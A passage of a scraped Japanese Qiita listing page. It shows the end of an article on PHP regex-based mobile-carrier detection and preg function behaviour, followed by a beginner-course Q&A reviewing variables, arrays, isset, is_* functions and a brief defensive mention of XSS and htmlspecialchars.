        <span class="k">echo</span> <span class="s1">'その他'</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">:</span>
        <span class="k">echo</span> <span class="s1">'DoCoMo'</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">:</span>
        <span class="k">echo</span> <span class="s1">'Softbank'</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span><span class="o">:</span>
        <span class="k">echo</span> <span class="s1">'au'</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">default</span><span class="o">:</span>
        <span class="k">echo</span> <span class="s1">'WILLCOM'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p>このコードの作成にあたっては、<a href="http://www.mt312.com/php/32/%20%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%82%A8%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%B3%E3%83%88%E6%90%BA%E5%B8%AF%E5%88%A4%E5%88%A5" rel="nofollow noopener" target="_blank">こちら</a>の情報を参考にしました。<br>
ちなみに私は、</p>

<ul>
<li>正規表現エンジンに対しての不要なエスケープは行わない</li>
<li>バックスラッシュに関してはPHP言語としての問題になってくるので全てエスケープ</li>
</ul>

<p>こういうポリシーのもとに書いています。<br>
<a href="http://qiita.com/mpyw/items/8dd5378cb01c877e1f7b" class="autolink" id="reference-995613db221b4096266b">http://qiita.com/mpyw/items/8dd5378cb01c877e1f7b</a><br>
　　</p>

<p>　　<br>
さて今回はこのぐらいで。<br>
・・・と思ったけど <code>preg_match</code> 以外の他の関数にも触れておきます。</p>

<ul>
<li>
<code>preg_match_all</code> で <strong>PREG_SET_ORDER</strong> のとき</li>
<li><code>preg_replace_callback</code></li>
</ul>

<p>この2つに関しては先ほどの <code>preg_match</code> と同じ認識でOKです。<br>
ところが、</p>

<ul>
<li>
<code>preg_match_all</code> で <strong>PREG_PATTERN_ORDER</strong> のとき</li>
</ul>

<p>このときの挙動は異なります。</p>

<ul>
<li>
<code>$matches[0][$i]</code> が存在していれば、
<code>$matches[1][$i]</code> <code>$matches[2][$i]</code> <code>$matches[3][$i]</code> ・・・は必ず存在する</li>
<li>実際にマッチしたものが無ければそれには空文字列が代入される</li>
</ul>

<p>一言でいえば、<br>
<ins>親配列($matches)が持つ子配列の要素数は必ず等しくなる</ins></p>

<p>ちなみに</p>

<ul>
<li><code>preg_replace</code></li>
</ul>

<p>これに関してはもっと制約が緩いです。<br>
例えば <strong>(　)</strong> が3つしかないのに、 <code>$4</code> とか書いちゃっても問題なく空文字列として処理してくれます。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />79位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>1</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/85f930cd893ddb27ff12">【PHP入門講座】 ちょっとひといき</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-26 01:53:55</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-3977cbcb0109b345b884">目次に戻る</a>
</h3>

<h1>
<span id="さてと" class="fragment"></span><a href="#%E3%81%95%E3%81%A6%E3%81%A8"><i class="fa fa-link"></i></a>さてと・・・</h1>

<h2>
<span id="わけわからん" class="fragment"></span><a href="#%E3%82%8F%E3%81%91%E3%82%8F%E3%81%8B%E3%82%89%E3%82%93"><i class="fa fa-link"></i></a>わけわからん！</h2>

<p>さすがに一気に詰め込み過ぎた気がします。でも実践全くしないで <strong>理論ばっかり学んでても楽しくない</strong> でしょ？というコンセプトのもとにゴリ押ししてみました。</p>

<h2>
<span id="ゴリ押しして終わりですかそうですか" class="fragment"></span><a href="#%E3%82%B4%E3%83%AA%E6%8A%BC%E3%81%97%E3%81%97%E3%81%A6%E7%B5%82%E3%82%8F%E3%82%8A%E3%81%A7%E3%81%99%E3%81%8B%E3%81%9D%E3%81%86%E3%81%A7%E3%81%99%E3%81%8B"><i class="fa fa-link"></i></a>ゴリ押しして終わりですかそうですか…</h2>

<p>そんな残酷なことは出来ないのでQ&amp;A形式で軽く復習します。</p>

<h1>
<span id="テキトーにqa" class="fragment"></span><a href="#%E3%83%86%E3%82%AD%E3%83%88%E3%83%BC%E3%81%ABqa"><i class="fa fa-link"></i></a>テキトーにQ&amp;A</h1>

<h2>
<span id="変数とは" class="fragment"></span><a href="#%E5%A4%89%E6%95%B0%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>変数とは？</h2>

<p>何かを入れておくための <strong>箱</strong> 。自由に見たり中身を入れ替えたり出来る。</p>

<h2>
<span id="定数とは" class="fragment"></span><a href="#%E5%AE%9A%E6%95%B0%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>定数とは？</h2>

<p>変数が箱ならこちらは <strong>ショーケース</strong> 。最初に作ったらもうあとは見るだけ。入れられるものも限られている。</p>

<h2>
<span id="関数とは" class="fragment"></span><a href="#%E9%96%A2%E6%95%B0%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>関数とは？</h2>

<p><strong>自動調理機</strong> 。 材料(引数)を必要個数だけぶち込むと、中で処理した後に完成したものを返して(returnして)くれる。</p>

<h2>
<span id="配列とは" class="fragment"></span><a href="#%E9%85%8D%E5%88%97%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>配列とは？</h2>

<p><strong>重箱</strong>。同じ階層の箱には順番が定められている。</p>

<h2>
<span id="もしかして-_get-も配列なの" class="fragment"></span><a href="#%E3%82%82%E3%81%97%E3%81%8B%E3%81%97%E3%81%A6-_get-%E3%82%82%E9%85%8D%E5%88%97%E3%81%AA%E3%81%AE"><i class="fa fa-link"></i></a>もしかして <code>$_GET</code> も配列なの？</h2>

<p>それに気付いたあなた、なかなかいいいセンスしてると思いますよ・・・！</p>

<h2>
<span id="xss攻撃って何だっけ" class="fragment"></span><a href="#xss%E6%94%BB%E6%92%83%E3%81%A3%E3%81%A6%E4%BD%95%E3%81%A0%E3%81%A3%E3%81%91"><i class="fa fa-link"></i></a>XSS攻撃って何だっけ？</h2>

<p>JavaScriptを埋め込む攻撃。<code>htmlspecialchars</code> 関数を使えば無効化出来る。但し属性値への割り当ては注意が必要。</p>

<h2>
<span id="isset-関数だけ何でエラー発生しないの" class="fragment"></span><a href="#isset-%E9%96%A2%E6%95%B0%E3%81%A0%E3%81%91%E4%BD%95%E3%81%A7%E3%82%A8%E3%83%A9%E3%83%BC%E7%99%BA%E7%94%9F%E3%81%97%E3%81%AA%E3%81%84%E3%81%AE"><i class="fa fa-link"></i></a><code>isset</code> 関数だけ何でエラー発生しないの？</h2>

<p><code>isset</code> は関数ではなく <strong>言語構文</strong> であって、<ins>エラーを抑制しながら存在を確認できる</ins>特別な能力を持っている。</p>

<h2>
<span id="is_string-関数があるってことは他にも-is_-とかあったり" class="fragment"></span><a href="#is_string-%E9%96%A2%E6%95%B0%E3%81%8C%E3%81%82%E3%82%8B%E3%81%A3%E3%81%A6%E3%81%93%E3%81%A8%E3%81%AF%E4%BB%96%E3%81%AB%E3%82%82-is_-%E3%81%A8%E3%81%8B%E3%81%82%E3%81%A3%E3%81%9F%E3%82%8A"><i class="fa fa-link"></i></a><code>is_string</code> 関数があるってことは他にも <code>is_***</code> とかあったり？</h2>

<p>全部挙げると・・・</p>

<h4>
<span id="変数操作関数に属するもの" class="fragment"></span><a href="#%E5%A4%89%E6%95%B0%E6%93%8D%E4%BD%9C%E9%96%A2%E6%95%B0%E3%81%AB%E5%B1%9E%E3%81%99%E3%82%8B%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>「変数操作」関数に属するもの</h4>

<p><code>is_array</code> <code>is_bool</code> <code>is_callable</code> <code>is_double</code> <code>is_float</code> <code>is_int</code> <code>is_integer</code> <code>is_long</code> <code>is_null</code> <code>is_numeric</code> <code>is_object</code> <code>is_real</code> <code>is_resource</code> <code>is_scalar</code></p>

<h4>
<span id="数学関数に属するもの" class="fragment"></span><a href="#%E6%95%B0%E5%AD%A6%E9%96%A2%E6%95%B0%E3%81%AB%E5%B1%9E%E3%81%99%E3%82%8B%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>「数学関数」に属するもの</h4>

<p><code>is_​finite</code> <code>is_​infinite</code>  <code>is_​nan</code></p>

<p>これだけあるみたい。中には中身が全く同じで別名の <strong>エイリアス</strong> というものが大量に紛れているから全部覚える必要なんて全くない。</p>

<h2>
<span id="俺がc言語で見たのは--だったと思うんだけど--って" class="fragment"></span><a href="#%E4%BF%BA%E3%81%8Cc%E8%A8%80%E8%AA%9E%E3%81%A7%E8%A6%8B%E3%81%9F%E3%81%AE%E3%81%AF--%E3%81%A0%E3%81%A3%E3%81%9F%E3%81%A8%E6%80%9D%E3%81%86%E3%82%93%E3%81%A0%E3%81%91%E3%81%A9--%E3%81%A3%E3%81%A6"><i class="fa fa-link"></i></a>俺がC言語で見たのは <code>!=</code> だったと思うんだけど、 <code>!==</code> って…？</h2>

<p>PHPの <strong><code>!=</code></strong> 演算子は非常にお節介な子だから絶対に使っちゃダメ！詳しくは後ほど！</p>

<h1>
<span id="もういいかな" class="fragment"></span><a href="#%E3%82%82%E3%81%86%E3%81%84%E3%81%84%E3%81%8B%E3%81%AA"><i class="fa fa-link"></i></a>もういいかな・・・</h1>

<h2>
<span id="まだ全然分かんねぇ何とかしてくれ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A0%E5%85%A8%E7%84%B6%E5%88%86%E3%81%8B%E3%82%93%E3%81%AD%E3%81%87%E4%BD%95%E3%81%A8%E3%81%8B%E3%81%97%E3%81%A6%E3%81%8F%E3%82%8C"><i class="fa fa-link"></i></a>まだ全然分かんねぇ何とかしてくれ</h2>

<p>次の項から丁寧に言語構造をちゃんと押さえていくので安心したまえ</p>
</div>
	</td>
</tr>
</table>
<br />
	</body>
</html>
